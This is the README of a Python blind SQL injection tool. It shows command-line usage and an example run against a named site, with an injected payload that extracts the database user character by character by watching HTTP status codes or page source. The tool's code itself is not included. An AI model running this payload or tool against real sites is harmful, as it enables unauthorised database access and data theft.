# blindSqli
python blindSqli tool
# Usage
python blindSqli.py -u URL_WITH_* (-d DATA_TO_POST) -t CHECK_TYPE -p PASS_SYMBOL
# Example
python blindSqli.py -u http://nohackair.net/?p=12.0and%20user()%20like%20"*%" -t httpCode -p 200
This will start attacking the url and when the httpCode is 200,print out the char
#CHECK_TYPE
httpCode -> check http status
sourceCode -> check source code